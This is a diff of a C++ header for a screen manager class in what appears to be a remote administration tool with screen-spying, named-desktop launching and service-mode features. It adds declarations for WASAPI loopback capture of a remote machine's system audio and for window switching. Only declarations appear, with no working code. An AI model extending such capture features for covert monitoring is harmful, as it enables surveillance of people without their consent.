@@ -13,6 +13,12 @@
 #include "ScreenSpy.h"
 #include "ScreenCapture.h"
 
+// WASAPI 前向声明 (COM 接口)
+struct IMMDevice;
+struct IAudioClient;
+struct IAudioCaptureClient;
+// WAVEFORMATEX 使用 void* 避免包含头文件
+
 bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName);
 
 bool IsWindows8orHigher();
@@ -26,12 +32,15 @@ struct UserParam;
 class CScreenManager : public CManager
 {
 public:
-    CScreenManager(IOCPClient* ClientObject, int n, void* user = nullptr);
+    CScreenManager(IOCPClient* ClientObject, int n, void* user = nullptr, BOOL priv=FALSE);
     virtual ~CScreenManager();
     HANDLE  m_hWorkThread;
     ScreenSettings m_ScreenSettings = { 20 };
+    QualityProfile m_QualityProfiles[QUALITY_COUNT];  // 本地质量配置（可被服务端覆盖）
 
-    void InitScreenSpy();
+    virtual void InitScreenSpy();
+    void LoadQualityProfiles();   // 从配置文件加载质量配置
+    void SaveQualityProfiles();   // 保存质量配置到配置文件
     static DWORD WINAPI WorkThreadProc(LPVOID lParam);
     VOID SendBitMapInfo();
     VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
@@ -55,9 +64,11 @@ public:
     std::string m_hash;
     std::string m_hmac;
     CONNECT_ADDRESS *m_conn = nullptr;
+    uint64_t m_MyClientID = 0;  // V2: 本机客户端ID
     void SetConnection(CONNECT_ADDRESS* conn)
     {
         m_conn = conn;
+        if (conn) m_MyClientID = conn->clientID;
     }
     bool IsRunAsService() const
     {
@@ -74,6 +85,7 @@ public:
 
     bool SwitchScreen();
     bool RestartScreen();
+    void SwitchToNextWindow();  // 切换到下一个窗口（类似 Alt+Tab）
     virtual BOOL OnReconnect();
     uint64_t            m_nReconnectTime = 0; // 重连开始时间
     uint64_t            m_DlgID = 0;
@@ -89,6 +101,24 @@ public:
     BOOL				m_rmouseDown;      // 标记右键是否按下
     POINT				m_rclickPoint;     // 右键点击坐标
     HWND				m_rclickWnd;	   // 右键窗口
+    int                 m_nSwitchWindowIndex = 0;  // 切换窗口索引
+
+    // ========== 系统音频捕获 (WASAPI Loopback) ==========
+    volatile BOOL       m_bAudioThreadRunning = FALSE;// 音频线程运行标志（独立于视频线程）
+    volatile BOOL       m_bAudioInitialized = FALSE;  // WASAPI 是否已初始化
+    HANDLE              m_hAudioThread = NULL;        // 音频线程句柄
+    HANDLE              m_hAudioEvent = NULL;         // 控制线程挂起/唤醒
+
+    // WASAPI 相关
+    IMMDevice*              m_pAudioDevice = nullptr;
+    IAudioClient*           m_pAudioClient = nullptr;
+    IAudioCaptureClient*    m_pCaptureClient = nullptr;
+    void*                   m_pWaveFormat = nullptr;  // 实际类型: WAVEFORMATEX*
+
+    BOOL InitWASAPILoopback();                        // 初始化 WASAPI Loopback
+    void UninitWASAPI();                              // 释放 WASAPI 资源
+    static DWORD WINAPI AudioThreadProc(LPVOID lpParam);  // 音频捕获线程
+    void HandleAudioCtrl(BYTE enable, BYTE persist);  // 处理音频控制命令
 };
 
 #endif // !defined(AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_)
